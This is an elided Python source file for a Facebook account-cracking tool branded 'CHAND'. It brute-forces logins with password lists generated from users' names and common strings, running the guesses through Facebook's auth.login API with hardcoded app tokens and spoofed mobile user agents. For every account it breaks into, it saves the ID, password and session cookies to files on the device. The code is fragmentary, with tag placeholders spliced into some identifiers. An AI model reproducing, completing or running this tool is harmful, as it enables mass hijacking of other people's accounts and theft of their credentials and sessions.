#iski Scirpt kabhi leak nahi krta but syed zada ne krdi ðŸ˜•
...
fbca = subprocess.check_output('getprop ro.product.[CHAND-CP]u.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')

xx=requests.get('https://raw.githubusercontent.com/Dilo110/files/main/ua.txt').text.splitlines()
def clear():
 os.system('clear')
 print(logo)
logo=("""\033[1;37m
     \033[1;32m$$$$$$\   $$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$\  \033[1;34mC\033[1;37m
\033[1;95m$$  __$$\ $$ |  $$ |$$  __$$\ $$$\  $$ |$$  __$$\ \033[1;31mH\033[1;37m
\033[1;95m$$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ |  $$ |\033[1;35mA\033[1;37m
\033[1;95m$$ |      $$$$$$$$ |$$$$$$$$ |$$ $$\$$ |$$ |  $$ |\033[1;35mN\033[1;37m
\033[1;91m$$ |      $$  __$$ |$$  __$$ |$$ \$$$$ |$$ |  $$ |\033[1;31mD\033[1;37m
\033[1;91m$$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |\033[1;34m\033[1;37m
\033[1;91m\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |$$$$$$$  |
\033[1;32m \______/ \__|  \__|\__|  \__|\__|  \__|\_______/                            
==============================================
 [~] AUTHOR     : RAFI ULLAH 
 [~] FACEBOOK : CHAND SA LADKA 
 [~] BROHTER    : ZEESHAN BALOCH
 [~] WHATSAPP : +923411343160
 [~] TOOL           : TRAIL
 [~] VERSION     : Coming
==============================================
 \x1b[1;97mNAME  HOGA"" BADNAME TO HONGE""
 ==============================================""")
def line():
 print(f'\033[1;37m------------------------------------------------')
loop=0
...
def file():
 ...
 with tred(max_workers=20) as Dilo:
  clear()
  tl = str(len(fo))
  ...
  for user in fo:
   ...
   passlist = plist
   if mthd =='1':
    Dilo.submit(m1,ids,names,passlist,fbcr)
   elif mthd =='2':
    Dilo.submit(m2,ids,names,passlist,fbcr)
   elif mthd =='3':
    Dilo.submit(m3,ids,names,passlist,fbcr)
   else:
    Dilo.submit(m2,ids,names,passlist,fbcr)
 print('\033[1;37m')
 line()
 print(' The process has completed')
 print(' Total OK/[CHAND-CP]: '+str(len(oks))+'/'+str(len([CHAND-CP]s)))
 line()
...
def gmail():
 ...
 try:
  limit=int(input(' [Ã¢â‚¬Â¢] Put limit: '))
 except ValueError:
  limit = 5000
 line()
 sim_id=''
 ...
 with tred(max_workers=30) as Khan:
  ...
  print("\033[1;37m \033[1;96m Use flight mode more then more for best result \033[1;37m")
  line()
  for user in fo:
   ids,names = user.split('|')
 ...
 with tred(max_workers=15) as khan:
  ...
  for psx in user:
   ...
   # passlist = [psx,ids,'khankhan','kingkhan','khan1122']
    ...
    passlist = [ids,psx,'100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶']
   else:
...
def m1(ids,names,passlist,fbcr):
 try:
  ...
  sys.stdout.write('\r\r\033[1;37m [CHAND-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
  fn = names.split(' ')[0]
  try:
   ln = names.split(' ')[1]
  except:
  ...
  for pw in passlist:
   ...
   ua = 'Dalvik/2.1.0 (Linux; U; Android 8; Redmi 13 pro Build/OPM3.130939.038) [FBAN/MobileAdsManagerAndroid;FBAV/308.0.0.31.46;FBBV/357378025;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/id_ID;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 13 pro;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'.replace('\n','')
   ...
   if "session_key" in po:
    ...
    open('/sdcard/Dilo/Dilo-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
    break
  loop+=1
 ...
 try:
  ...
  for pw in passlist:
   ...
   if '350685531728' in accessToken:
    ...
    fban = 'Orca-Android'
    fbpn = 'com.facebook.orca'
   ua = 'Dalvik/2.1.0 (Linux; U; Android 13; Redmi 13 pro Build/TQ1A.773046.026) [FBAN/MobileAdsManagerAndroid;FBAV/404.0.0.69.98;FBBV/268820102;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/ca_ES;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 13 pro;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'.replace('\n','')
   ...
   if "session_key" in po:
    ...
    print('\r\r\033[1;32m [CHAND-OK] '+ids+' | '+pas)
    oks.append(ids)
    open('/sdcard/Dilo/Dilo-M2-OK.txt','a').write(ids+'|'+pas+'\n')
    session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
    open('/sdcard/Dilo/Dilo-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
    break
 ...
 try:
  ...
  for pw in passlist:
   ...
   if "session_key" in po:
    ...
    print('\r\r\033[1;32m [CHAND-OK] '+ids+' | '+pas)
    oks.append(ids)
    open('/sdcard/Dilo/Dilo-M3-OK.txt','a').write(ids+'|'+pas+'\n')
    session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
    open('/sdcard/Dilo/Dilo-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
    break
  loop+=1
 except requests.exceptions.ConnectionError:
  time.sleep(20)
...
def rd(ids,passlist,fbcr):
 try:
  global ok,loop,sim_id
  sys.stdout.write('\033[1;96m [CHAND] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
  for pas in passlist:
   tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
   accessToken = random.choice(tokenlist)
   fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
   ...
   if '350685531728' in accessToken:
    ...
    fban = 'Orca-Android'
    fbpn = 'com.facebook.orca'
   ua = 'Dalvik/2.1.0 (Linux; U; Android 5; Redmi 13 pro Build/L3QYNT) [FBAN/MobileAdsManagerAndroid;FBAV/392.0.0.46.96;FBBV/374076471;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/bs_BA;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 13 pro;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'.replace('\n','')
   head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
   data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"[CHAND-CP]l":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
   ...
   if "session_key" in po:
    uid = str(po['uid'])
    token = po['access_token']
    print('\033[1;95m [CHAND-OK] '+uid+' | '+pas)
    oks.append(ids)
    open('/sdcard/Dilo/Dilo-R-OK.txt','a').write(uid+'|'+pas+'\n')
    session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
    open('/sdcard/Dilo/Dilo-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
    break
  loop+=1
 except requests.exceptions.ConnectionError:
  time.sleep(20)
